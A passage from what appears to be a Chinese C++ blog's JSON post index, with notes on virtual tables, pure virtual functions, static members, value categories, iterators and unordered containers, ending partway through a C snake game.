子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的） 这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。 多重继承（有虚函数覆盖）下面我们再来看看，如果发生虚函数覆盖的情况。下图中，我们在子类中覆盖了父类的f()函数。 下面是对于子类实例中的虚函数表的图： 我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如： 1234567891011Derive d;Base1 *b1 = &amp;d;Base2 *b2 = &amp;d;Base3 *b3 = &amp;d;b1-&gt;f(); //Derive::f()b2-&gt;f(); //Derive::f()b3-&gt;f(); //Derive::f()b1-&gt;g(); //Base1::g()b2-&gt;g(); //Base2::g()b3-&gt;g(); //Base3::g() 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。 通过父类型的指针访问子类自己的虚函数 我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数： 12Base1 *b1 = new Derive();b1-&gt;f1(); //编译出错 任何妄图使用父类指针想调用子类中的未覆盖父类的成员函数的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点） 访问non-public的虚函数 另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non-public的虚函数，这是很容易做到的。如： 1234567891011121314151617class Base &#123; private: virtual void f() &#123; cout &lt;&lt; \"Base::f\" &lt;&lt; endl; &#125; &#125;; class Derive : public Base&#123; &#125;; typedef void(*Fun)(void); void main() &#123; Derive d; Fun pFun = (Fun)*((int*)*(int*)(&amp;d)+0); pFun();&#125; C++纯虚函数定义纯虚函数是在基类中声明的虚函数，它在基类中没有定义，但要求任何派生类都要定义自己的实现方法。在基类中实现纯虚函数的方法是在函数原型后加“=0” 1virtual void funtion()=0 引入原因 为了方便使用多态特性，我们常常需要在基类中定义虚拟函数。 在很多情况下，基类本身生成对象是不合情理的。例如，动物作为一个基类可以派生出老虎、孔雀等子类，但动物本身生成对象明显不合常理。 为了解决上述问题，引入了纯虚函数的概念，将函数定义为纯虚函数（方法：virtual ReturnType Function()= 0;），则编译器要求在派生类中必须予以重写以实现多态性。同时含有纯虚拟函数的类称为抽象类，它不能生成对象。这样就很好地解决了上述两个问题。 相似概念 多态性指相同对象收到不同消息或不同对象收到相同消息时产生不同的实现动作。C++支持两种多态性：编译时多态性，运行时多态性。a、编译时多态性：通过重载函数实现b、运行时多态性：通过虚函数实现。 虚函数虚函数是在基类中被声明为virtual，并在派生类中重新定义的成员函数，可实现成员函数的动态覆盖（Override） 抽象类包含纯虚函数的类称为抽象类。由于抽象类包含了没有定义的纯虚函数，所以不能定义抽象类的对象。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"多态","slug":"多态","permalink":"http://coordinate.wang/tags/多态/"}]},{"title":"C++类静态成员与类静态成员函数详解","slug":"2017-05-30-C++类静态成员与类静态成员函数详解","date":"2017-05-29T16:00:00.000Z","updated":"2018-02-18T03:29:06.684Z","comments":true,"path":"2017/05/30/2017-05-30-C++类静态成员与类静态成员函数详解/","link":"","permalink":"http://coordinate.wang/2017/05/30/2017-05-30-C++类静态成员与类静态成员函数详解/","excerpt":"","text":"转载自脚本之家当将类的某个数据成员声明为static时，该静态数据成员只能被定义一次，而且要被同类的所有对象共享。各个对象都拥有类中每一个普通数据成员的副本，但静态数据成员只有一个实例存在，与定义了多少类对象无关。静态方法就是与该类相关的，是类的一种行为，而不是与该类的实例对象相关。静态数据成员的用途之一是统计有多少个对象实际存在。静态数据成员不能在类中初始化，实际上类定义只是在描述对象的蓝图，在其中指定初值是不允许的。也不能在类的构造函数中初始化该成员，因为静态数据成员为类的各个对象共享，否则每次创建一个类的对象则静态数据成员都要被重新初始化。静态成员不可在类体内进行赋值，因为它是被所有该类的对象所共享的。你在一个对象里给它赋值，其他对象里的该成员也会发生变化。为了避免混乱，所以不可在类体内进行赋值。静态成员的值对所有的对象是一样的。静态成员可以被初始化，但只能在类体外进行初始化。一般形式：数据类型类名：：静态数据成员名＝初值注意：不能用参数初始化表对静态成员初始化。一般系统缺省初始为0。静态成员是类所有的对象的共享的成员，而不是某个对象的成员。它在对象中不占用存储空间，这个属性为整个类所共有，不属于任何一个具体对象。所以静态成员不能在类的内部初始化，比如声明一个学生类，其中一个成员为学生总数，则这个变量就应当声明为静态变量，应该根据实际需求来设置成员变量。 12345678910111213141516171819202122232425262728#include \"iostream\"using namespace std;class test&#123;private: int x; int y;public: static int num; static int Getnum() &#123; x+=5; // 这行代码是错误的，静态成员函数不能调用非静态数据成员，要通过类的对象来调用。 num+=15; return num; &#125;&#125;;int test::num = 10;int main(void)&#123; test a; cout&lt;&lt;test::num&lt;&lt;endl; //10 test::num = 20; cout&lt;&lt;test::num&lt;&lt;endl; //20 cout&lt;&lt;test::Getnum()&lt;&lt;endl; //35 cout&lt;&lt;a.Getnum()&lt;&lt;endl; //50 system(\"pause\"); return 0;&#125; 通过上例可知： x+=5; // 这行代码是错误的静态函数成员必须通过对象名来访问非静态数据成员。 12345678910class a&#123;public: static FunctionA() &#123; menber = 1; &#125;private: int menber;&#125; 编译上述代码，出错。原因很简单大家都知道，静态成员函数不能访问非静态成员，这是因为静态函数属于类而不是属于整个对象，静态函数中的 member可能都没有分配内存。静态成员函数没有隐含的this自变量。所以，它就无法访问自己类的非静态成员。那要想访问怎么办呢？地球人都知道只要将： 123int menber;//change the line above to:static int menber; 但是这个方法让我们不得不将static function内用到的成员变量都变成static的了，而且static的成员还要显式初始化，有没有更好的方法？答案是肯定的。代码说话： 12345678910111213141516class a&#123;public: static FunctionA(a* _a) &#123; _a-&gt; menber = 1; cout&lt;&lt;_a-&gt; menber&lt;&lt;endl; _a-&gt;f(); &#125;void f()&#123; cout&lt;&lt;\"f被调用了\"&lt;&lt;endl;&#125;private: int menber;&#125;; 前提是这个类要分配了内存空间。其实这里我做的就是将一个对象指针作为静态成员函数的“this”指针，意在模仿传递非静态成员函数里this变量(在非静态成员函数中都有this指针(push在ECX中似乎)) 另外，静态成员函数在类外实现时候无须加static关键字，否则是错误的。若在类的体外来实现上述的那个静态成员函数，不能加static关键字，这样写就可以了: 1234int test::Getnum()&#123; .........&#125; static成员的所有者是类本身和对象，但是多有对象拥有一样的静态成员。从而在定义对象是不能通过构造函数对其进行初始化。 静态成员不能在类定义里边初始化，只能在class body外初始化。 静态成员仍然遵循public，private，protected访问准则。 静态成员函数没有this指针，它不能返回非静态成员，因为除了对象会调用它外，类本身也可以调用。 静态成员函数可以直接访问该类的静态数据和函数成员，而访问非静态数据成员必须通过参数传递的方式得到一个对象名，然后通过对象名来访问。 12345678910111213141516171819202122232425262728class Myclass&#123;private: int a,b,c; static int Sum; //声明静态数据成员public: Myclass(int a,int b,int c); void GetSum();&#125;;int Myclass::Sum=0; //定义并初始化静态数据成员Myclass::Myclass(int a,int b,int c)&#123; this-&gt;a=a; this-&gt;b=b; this-&gt;c=c; Sum+=a+b+c;&#125;void Myclass::GetSum()&#123; cout &lt;&lt;\"Sum=\" &lt;&lt;Sum &lt;&lt;endl;&#125;int main(void)&#123; Myclass me(10,20,30); me.GetSum(); system(\"pause\"); return 0;&#125; 由上例可知，非静态成员函数可以任意地访问静态成员函数和静态数据成员。非静态成员函数Myclass(int a,int b,int c)和GetSum()都访问了静态数据成员Sum。静态成员函数不能访问非静态成员函数和非静态数据成员。关于静态成员函数，可以总结为以下几点： 出现在类体外的函数定义不能指定关键字static； 静态成员之间可以相互访问，包括静态成员函数访问静态数据成员和访问静态成员函数； 非静态成员函数可以任意地访问静态成员函数和静态数据成员； 静态成员函数不能访问非静态成员函数和非静态数据成员； 由于没有this指针的额外开销，因此静态成员函数与类的全局函数相比速度上会有少许的增长； 调用静态成员函数，可以用成员访问操作符(.)和(-&gt;)为一个类的对象或指向类对象的指针调用静态成员函数，当同一类的所有对象使用一个量时，对于这个共用的量，可以用静态数据成员变量，这个变量对于同一类的所有的对象都取相同的值。静态成员变量只能被静态成员函数调用。静态成员函数也是由同一类中的所有对象共用。只能调用静态成员变量和静态成员函数。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"}]},{"title":"lvalue,rvalue,xlvalue,glvalue,prvalue","slug":"2017-05-29-lvalue,rvalue,xlvalue,glvalue,prvalue","date":"2017-05-28T16:00:00.000Z","updated":"2018-02-18T03:29:06.668Z","comments":true,"path":"2017/05/29/2017-05-29-lvalue,rvalue,xlvalue,glvalue,prvalue/","link":"","permalink":"http://coordinate.wang/2017/05/29/2017-05-29-lvalue,rvalue,xlvalue,glvalue,prvalue/","excerpt":"","text":"Value categoriesEach C++ expression (an operator with its operands, a literal, a variable name, etc.) is characterized by two independent properties: a type and a value category. Each expression has some non-reference type, and each expression belongs to exactly one of the three primary value categories: prvalue, xvalue, lvalue, defined as follows: a glvalue is an expression whose evaluation determines the identity of an object, bit-field, or function; a prvalue is an expression whose evaluation either computes the value of the operand of an operator (such prvalue has no result object), or initializes an object or a bit-field (such prvalue is said to have a result object). All class and array prvalues have a result object even if it is discarded. In certain contexts, temporary materialization occurs to create a temporary as the result object; an xvalue is a glvalue that denotes an object or bit-field whose resources can be reused; an lvalue is a glvalue that is not an xvalue; an rvalue is a prvalue or an xvalue. Note: this taxonomy went through significant changes with past C++ standard revisions, see History below for details. Primary categorieslvalueThe following expressions are lvalue expressions: the name of a variable or a function in scope, regardless of type, such as std::cin or std::endl. Even if the variable’s type is rvalue reference, the expression consisting of its name is an lvalue expression; a function call or an overloaded operator expression of lvalue reference return type, such as std::getline(std::cin, str), std::cout &lt;&lt; 1, str1 = str2, or ++it; a = b, a += b, a %= b, and all other built-in assignment and compound assignment expressions; ++a and –a, the built-in pre-increment and pre-decrement expressions; *p, the built-in indirection expression; a[n] and p[n], the built-in subscript expressions, except where a is an array rvalue (since C++11); a.m, the member of object expression, except where m is a member enumerator or a non-static member function, or where a is an rvalue and m is a non-static data member of non-reference type; p-&gt;m, the built-in member of pointer expression, except where m is a member enumerator or a non-static member function; a.*mp, the pointer to member of object expression, where a is an lvalue and mp is a pointer to data member; p-&gt;*mp, the built-in pointer to member of pointer expression, where mp is a pointer to data member; a, b, the built-in comma expression, where b is an lvalue; a ? b : c, the ternary conditional expression for some a, b, and c; a string literal, such as “Hello, world!”; a cast expression to lvalue reference type, such as static_cast&lt;int&amp;&gt;(x); a function call or an overloaded operator expression of rvalue reference to function return type; a cast expression to rvalue reference to function type, such as static_cast(x).(since C++11) Properties: Same as glvalue (below). Address of an lvalue may be taken: &amp;++i[1] and &amp;std::endl are valid expressions. A modifiable lvalue may be used as the left-hand operand of the built-in assignment and compound assignment operators. An lvalue may be used to initialize an lvalue reference; this associates a new name with the object identified by the expression. prvalueThe following expressions are prvalue expressions: a literal (except for string literal), such as 42, true or nullptr; a function call or an overloaded operator expression of non-reference return type, such as str.substr(1, 2), str1 + str2, or it++; a++ and a–, the built-in post-increment and post-decrement expressions; a + b, a % b, a &amp; b, a &lt;&lt; b, and all other built-in arithmetic expressions; a &amp;&amp; b, a || b, !a, the built-in logical expressions; a &lt; b, a == b, a &gt;= b, and all other built-in comparison expressions; &amp;a, the built-in address-of expression; a.m, the member of object expression, where m is a member enumerator or a non-static member function[2], or where a is an rvalue and m is a non-static data member of non-reference type (until C++11); p-&gt;m, the built-in member of pointer expression, where m is a member enumerator or a non-static member function[2]; a.*mp, the pointer to member of object expression, where mp is a pointer to member function[2], or where a is an rvalue and mp is a pointer to data member (until C++11); p-&gt;*mp, the built-in pointer to member of pointer expression, where mp is a pointer to member function[2]; a, b, the built-in comma expression, where b is an rvalue; a ? b : c, the ternary conditional expression for some a, b, and c; a cast expression to non-reference type, such as static_cast(x), std::string{}, or (int)42; the this pointer; a lambda expression, such as { return x * x; }.(since C++11) Properties: Same as rvalue (below). A prvalue cannot be polymorphic: the dynamic type of the object it identifies is always the type of the expression. A non-class non-array prvalue cannot be cv-qualified. (Note: a function call or cast expression may result in a prvalue of non-class cv-qualified type, but the cv-qualifier is immediately stripped out.) A prvalue cannot have incomplete type (except for type void, see below, or when used in decltype specifier). xvalueThe following expressions are xvalue expressions: a function call or an overloaded operator expression of rvalue reference to object return type, such as std::move(x); a[n], the built-in subscript expression, where one operand is an array rvalue ; a.m, the member of object expression, where a is an rvalue and m is a non-static data member of non-reference type; a.*mp, the pointer to member of object expression, where a is an rvalue and mp is a pointer to data member; a ? b : c, the ternary conditional expression for some a, b, and c; a cast expression to rvalue reference to object type, such as static_cast&lt;char&amp;&amp;&gt;(x); any expression that designates a temporary object, after temporary materialization.(since C++17) Properties: Same as rvalue (below). Same as glvalue (below). In particular, like all rvalues, xvalues bind to rvalue references, and like all glvalues, xvalues may be polymorphic, and non-class xvalues may be cv-qualified. Mixed categoriesglvalueA glvalue expression is either lvalue or xvalue.Properties: A glvalue may be implicitly converted to a prvalue with lvalue-to-rvalue, array-to-pointer, or function-to-pointer implicit conversion. A glvalue may be polymorphic: the dynamic type of the object it identifies is not necessarily the static type of the expression. A glvalue can have incomplete type, where permitted by the expression. rvalueAn rvalue expression is either prvalue or xvalue.Properties: Address of an rvalue may not be taken: &amp;int(), &amp;i++[3], &amp;42, and &amp;std::move(x) are invalid. An rvalue can’t be used as the left-hand operand of the built-in assignment or compound assignment operators. An rvalue may be used to initialize a const lvalue reference, in which case the lifetime of the object identified by the rvalue is extended until the scope of the reference ends. An rvalue may be used to initialize an rvalue reference, in which case the lifetime of the object identified by the rvalue is extended until the scope of the reference ends. When used as a function argument and when two overloads of the function are available, one taking rvalue reference parameter and the other taking lvalue reference to const parameter, an rvalue binds to the rvalue reference overload (thus, if both copy and move constructors are available, an rvalue argument invokes the move constructor, and likewise with copy and move assignment operators). 123456789101112131415161718struct S &#123; S () = default ; S (const S &amp;) = delete ; S &amp;operator= (const S &amp;) = delete ; S (S &amp;&amp;) = default ; S &amp;operator= (S &amp;&amp;) = default ;&#125; ;struct A &#123; S p0 ; S p1[2] ;&#125; ;int main () &#123; S p0 = A ().p0 ; S p1 = A ().p1[0] ; return 0 ;&#125; p1哪里是编译不通过的，A ().p1[0]不是右值好像不满足xvalue的描述 A().p1[0] 的意思是（实际上也是这么运作的）先计算A().p1（这是一个lvalue，而不是xvalue，因为 3）的要求是m为非引用，当然也就是非指针了。 ）， 再取它的第1个元素（根据lvalue的性质，这当然也是一个左值了）。一言以蔽之，A().p1[0] 的运算顺序是(A().p1)[0]，是一个lvalue，而不是xvalue（在C++11中）。PS： ‘.’的优先级和[]一样，因此，从左到右计算。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"lvalue","slug":"lvalue","permalink":"http://coordinate.wang/tags/lvalue/"},{"name":"rvalue","slug":"rvalue","permalink":"http://coordinate.wang/tags/rvalue/"},{"name":"xlvalue","slug":"xlvalue","permalink":"http://coordinate.wang/tags/xlvalue/"},{"name":"glvalue","slug":"glvalue","permalink":"http://coordinate.wang/tags/glvalue/"},{"name":"prvalue","slug":"prvalue","permalink":"http://coordinate.wang/tags/prvalue/"}]},{"title":"迭代器相关的辅助函数","slug":"2017-05-27-迭代器相关的辅助函数","date":"2017-05-26T16:00:00.000Z","updated":"2018-02-18T03:29:06.653Z","comments":true,"path":"2017/05/27/2017-05-27-迭代器相关的辅助函数/","link":"","permalink":"http://coordinate.wang/2017/05/27/2017-05-27-迭代器相关的辅助函数/","excerpt":"","text":"advance定义于头文件\\&lt;iterator> 12template&lt; class InputIt, class Distance &gt;void advance( InputIt&amp; it, Distance n ); 增加迭代器it n个元素。如果n为负，迭代器递减。在这种情况下，InputIt的BidirectionalIterator必须满足的要求，否则该行为是未定义。例子： 1234567891011#include &lt;iostream&gt;#include &lt;iterator&gt;#include &lt;vector&gt; int main() &#123; std::vector&lt;int&gt; v&#123; 3, 1, 4 &#125;; auto vi = v.begin(); std::advance(vi, 2); std::cout &lt;&lt; *vi &lt;&lt; '\\n';&#125; 结果为 4 next和prev定义于头文件 \\&lt;iterator> 123template&lt; class ForwardIt &gt;ForwardIt next( ForwardIt it, typename std::iterator_traits&lt;ForwardIt&gt;::difference_type n = 1 ); 返回的nth的继任者的迭代器it。定义于头文件\\&lt;iterator> 123template&lt; class BidirIt &gt;BidirIt prev( BidirIt it, typename std::iterator_traits&lt;BidirIt&gt;::difference_type n = 1 ); 返回的nth的前身迭代器it。前面提到了next的一个有效的用处就是在forward和bidirectional迭代器。里一个用处主要是before_begin 12345678auto posBefore = list.before_begin();for(; next(posBefore) != list.end(); ++posBefore)&#123; if(*next(posBefore) %2 == 0) &#123; break; &#125;&#125; distance123template&lt; class InputIt &gt;typename std::iterator_traits&lt;InputIt&gt;::difference_type distance( InputIt first, InputIt last ); 返回first和last之间的元素数量。如果last不能由first递增得到，则函数的行为是未定义的。例子： 12345678910#include &lt;iostream&gt;#include &lt;iterator&gt;#include &lt;vector&gt; int main() &#123; std::vector&lt;int&gt; v&#123; 3, 1, 4 &#125;; auto distance = std::distance(v.begin(), v.end()); std::cout &lt;&lt; distance &lt;&lt; '\\n';&#125; 结果为3 处理两个non-random-access迭代器之间的距离时要十分小心。第一迭代器所知的元素绝对不能在第二迭代器所指元素的后方，否则会导致不明确的行为。 123Iter_swaptemplate&lt; class ForwardIt1, class ForwardIt2 &gt;void iter_swap( ForwardIt1 a, ForwardIt2 b ); 交换给定的迭代器指向的元素的值。迭代器的类型不必相同，但其所指的两个值必须可以相互赋值。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;list&gt;#include &lt;algorithm&gt;#include &lt;iterator&gt;#include \"print.hpp\"using namespace std;int main()&#123; list&lt;int&gt; coll; // insert elements from 1 to 9 for (int i=1; i&lt;=9; ++i) &#123; coll.push_back(i); &#125; PRINT_ELEMENTS(coll); // swap first and second value iter_swap (coll.begin(), next(coll.begin())); PRINT_ELEMENTS(coll); // swap first and last value iter_swap (coll.begin(), prev(coll.end())); PRINT_ELEMENTS(coll);&#125; 程序输出如下： 1231 2 3 4 5 6 7 8 92 1 3 4 5 6 7 8 99 1 3 4 5 6 7 8 2 注意，next和prev始自c++11，因此若以operator++和—取而代之，可以参看前面讲的内容。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"迭代器","slug":"迭代器","permalink":"http://coordinate.wang/tags/迭代器/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"迭代器种类","slug":"2017-05-26-迭代器种类","date":"2017-05-25T16:00:00.000Z","updated":"2018-02-18T03:29:06.653Z","comments":true,"path":"2017/05/26/2017-05-26-迭代器种类/","link":"","permalink":"http://coordinate.wang/2017/05/26/2017-05-26-迭代器种类/","excerpt":"","text":"Output迭代器输出迭代器（OutputIterator）是能写入所指元素的迭代器（Iterator）。实现输出迭代器（OutputIterator）的类型的例子是 std::ostream_iterator。当向前迭代器（ForwardIterator）、双向迭代器（BidirectionalIterator）或随机访问迭代器（RandomAccessIterator）在自身的要求之上满足的输出迭代器（OutputIterator）要求时，它被描述为可变的。 Input迭代器输入迭代器（InputIterator）是能从所指向元素读取的迭代器（Iterator）。输入迭代器（InputIterator）仅保证单趟算法的合法性：一旦 InputIterator i 被自增，则所有其先前值的副本都可能变得非法。Input迭代器只能读取元素一次。如果你复制input迭代器，并令源input迭代器和新产生的拷贝都向前读取，可能会遍历到不同的值。 Forward（前向）迭代器向前迭代器（ForwardIterator）是一种能从所指向元素读取数据的迭代器（Iterator）。不同于输入迭代器（InputIterator）和输出迭代器（OutputIterator），它能被用于多趟算法。和input迭代器不同的是，两个forward迭代器如果指向同一个元素，operator==会获得true，如果两者都递增，会再次指向同一元素。有以下对象和类型提供： class forward_list&lt;&gt; unordered容器 Bidirectional（双向迭代器）双向迭代器（BidirectionalIterator）是能双向移动（即自增与自减）的向前迭代器（ForwardIterator）。有以下对象和类型提供： class list&lt;&gt; associative容器 RandomAccess（随机访问）迭代器随机访问迭代器（RandomAccessIterator）是能在常数时间内移动到指向任何元素的双向迭代器（BidirectionalIterator）。指向数组元素的指针满足所有随机访问迭代器（RandomAccessIterator）的要求。有以下对象和类型提供： 可随机访问的容器（array、vector、deque） string（string、wstring） 寻常的c-style（pointer） Vector迭代器的increment和decrement一般而言你可以递增或递减临时性迭代器，但对于array、vector和string就不行。例子： 12345std::vector&lt;int&gt; coll;if(coll.size() &gt; 1)&#123; std::sort(++coll.begin(), coll.end());&#125; 编译++coll.begin可能会失败，但是如果使用的是deque就不会。原因是，vector、array和string的迭代器通常被实现为寻常pointer，而C++并不允许你修改任何基础类型的临时类型（包括pointer）的临时对象，但对于struct和class就允许。因此，上面的代码对于vector、array和string以外的容器都没问题，因为那些容器的迭代器都不可能是寻常pointer。但对于vector、array和string，上面的代码是否可行就取决于具体实现。在c++11之前的做法是使用一个辅助对象:: 123456std::vector&lt;int&gt; coll;if(coll.size() &gt; 1)&#123; std:vector&lt;int&gt;::iterator beg = coll.begin(); std::sort(++beg, coll.end());&#125; C++11之后可以使用next 12345std::vector&lt;int&gt; coll;if(coll.size() &gt; 1)&#123; std::sort(std::next(coll.begin()), coll.end());&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"迭代器","slug":"迭代器","permalink":"http://coordinate.wang/tags/迭代器/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"STL容器（8）无序容器","slug":"2017-05-25-STL容器8无序容器","date":"2017-05-24T16:00:00.000Z","updated":"2018-02-18T03:29:06.637Z","comments":true,"path":"2017/05/25/2017-05-25-STL容器8无序容器/","link":"","permalink":"http://coordinate.wang/2017/05/25/2017-05-25-STL容器8无序容器/","excerpt":"","text":"定义于头文件\\&lt;unordered_set> 123456template&lt; class Key, class Hash = std::hash&lt;Key&gt;, class KeyEqual = std::equal_to&lt;Key&gt;, class Allocator = std::allocator&lt;Key&gt;&gt; class unordered_set; (C++11 起)无序集合是一个关联容器，包含一些类型为Key的唯一对象。搜索，插入和删除具有平摊的常数时间复杂度。定义于头文件\\&lt;unordered_set> 123456template&lt; class Key, class Hash = std::hash&lt;Key&gt;, class KeyEqual = std::equal_to&lt;Key&gt;, class Allocator = std::allocator&lt;Key&gt;&gt; class unordered_multiset; (C++11 起)无序多重集合是一个关联容器，含有一些类型为Key的，可能不是唯一的对象。搜索，插入和删除具有平摊的常数时间复杂度。定义于头文件 \\&lt;unordered_map> 1234567template&lt; class Key, class T, class Hash = std::hash&lt;Key&gt;, class KeyEqual = std::equal_to&lt;Key&gt;, class Allocator = std::allocator&lt; std::pair&lt;const Key, T&gt; &gt;&gt; class unordered_map; (C++11 起)无序映射是一个关联容器，包含带有唯一键的键值对。搜索，插入和去除具有平摊的常数时间复杂度。定义于头文件 \\&lt;unordered_map> 1234567template&lt; class Key, class T, class Hash = std::hash&lt;Key&gt;, class KeyEqual = std::equal_to&lt;Key&gt;, class Allocator = std::allocator&lt; std::pair&lt;const Key, T&gt; &gt;&gt; class unordered_multimap; (C++11 起)无序多重映射是一个无序关联容器，支持多个相等的键（unordered_multimap中，每个键对应的值可能不唯一）以及相关联的另一种类型的值。unordered_multimap类支持前向迭代器。搜索，插入和去除具有平摊的常数时间复杂度。 Unordered容器能力Unordered容器比起寻常的associative容器，要的优点是：在安插、删除、查找元素时获得amortized常量时间，因为偶尔发生的rehashing可能是个大型操作。主要缺点是：Unordered容器不提供operator&lt;、&gt;、&lt;=和&gt;=这些容器的多重实例。不提供lower_bound和upper_bound。由于iterator只保证至少是个forward iterator，所以别的迭代器的算法都是用不了。由于元素的(key)value关系到元素的位置，所以不可以直接修改(key)value，通过iterator访问时，元素的(key)value是常量。Erase函数不会造成指向元素的iterator、reference和pointer失效。在调用insert、reserve和clear、rehash时会rehashing。 创建和控制Unordered容器欲定义最大负载系数，你必须在构建后立刻调用一个成员函数： 12std::unordered_set&lt;std::string&gt; coll;coll.max_load_factor(0.7); 通常0.7~0.8是速度和内存消耗量之间一个不错的折中。默认的最大负载系数时1.0，意思是通常碰撞会发生在rehash之前。reverse与rehash的区别在于：如果在大负载系数时0.7而你打算准备100个元素，你必须将100初一0.7。也就是你必须传入143给rehash以避免在最高达到100个元素的情况下出现进一步rehash。如果使用reverse，这一计算是内部进行的额，所以你可以仅仅传递hashtable应该筹备的元素个数：rehash：Sets the number of buckets to count and rehashes the container, i.e. puts the elements into appropriate buckets considering that total number of buckets has changed. If the new number of buckets makes load factor more than maximum load factor (count &lt; size() / max_load_factor()), then the new number of buckets is at least size() / max_load_factor().reverse：Sets the number of buckets to the number needed to accomodate at least count elements without exceeding maximum load factor and rehashes the container, i.e. puts the elements into appropriate buckets considering that total number of buckets has changed. Effectively calls rehash(std::ceil(count / max_load_factor())). Unordered容器的其他操作Unordered左右两端容器必须有相同类型，更明确地说是其hash function的类型以及equivalence criterion(等价标准)必须相同，即使hash函数本身可能不同。与map/multimap对应的是unordered map/multimap的元素类型是pair，意味着你需要first和second才能范文一个元素的key和value。 1234for(auto elem&amp; : coll)&#123; std::cout &lt;&lt; \"key：\" &lt;&lt; elem.first &lt;&lt; \"\\t\" &lt;&lt; std::endl;&#125; 改变key的值会导致错误，改变元素的value就没问题，只要elem是个non-const reference且value的类型不是const： 1elem.second = 13.5; 如果你是用算法和lambda来操作map内的元素，你必须明确元素类型，可以查看map的例子一般而言，erasing函数并不会令“指向至其他元素”的iterator和reference失效。然而成员函数insert和emplace有可能令所有iterator失效，当rehashing发生，尽管指向元素的reference将总是保持有效。rehashing之所以发生，是由于一次安插动作造成最终元素的个数大于等于bucket数量乘以最大负载系数。insert和emplace成员函数不会影响指向容器元素的reference的有效性。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"多种语言实现贪吃蛇（c）","slug":"2017-05-24-多种语言实现贪吃蛇（c）","date":"2017-05-23T16:00:00.000Z","updated":"2018-02-18T03:29:06.637Z","comments":true,"path":"2017/05/24/2017-05-24-多种语言实现贪吃蛇（c）/","link":"","permalink":"http://coordinate.wang/2017/05/24/2017-05-24-多种语言实现贪吃蛇（c）/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267/****************************************************************************************************************文件:snake.c**编写者:coordinate**编写日期:2017_6_2**简要描述:贪吃蛇游戏**运行环境:vs2015**************************************************************************************************************/#include&lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;conio.h&gt;#include &lt;Windows.h&gt;#define length 30 // map length#define width 30 // map width//mapint map[length][width] = &#123;0&#125;;//gameover flagint gameover = 0;//time statuschar status;int sleepTime = 100;//food coordianteint food[2];//snake structtypedef struct SNAKE&#123; int x; int y; struct SNAKE *next;&#125;snake;snake *head; //snake headvoid init();void createMap();void createSnake();void makeFood();void endGame();int bitself();void crosswall();void gameControl();void init()&#123; for (int i = 0; i &lt; length; ++i) &#123; for (int j = 0; j &lt; width; ++j) &#123; if (map[i][j] == 1) &#123; printf(\"■\"); &#125; else &#123; printf(\" \"); &#125; &#125; printf(\"\\n\"); &#125; &#125;//create mapvoid createMap()&#123; for (int i = 0; i &lt; length; ++i) &#123; for (int j = 0; j &lt; width; ++j) &#123; if (i == 0 || j == 0 || i== length-1 || j == width - 1) &#123; map[i][j] = 1; &#125; &#125; printf(\"\\n\"); &#125; &#125;//create Snakevoid createSnake()&#123; snake *tail; int i; tail = (snake*)malloc(sizeof(snake)); tail-&gt;x = length / 2; tail-&gt;y = width / 2; tail-&gt;next = NULL; for (i = 1; i &lt;= 3; i++) &#123; head = (snake*)malloc(sizeof(snake)); head-&gt;next = tail; head-&gt;x = length / 2 + i; head-&gt;y = width / 2; tail = head; &#125; while (tail != NULL) &#123; map[tail-&gt;x][tail-&gt;y] = 1; tail = 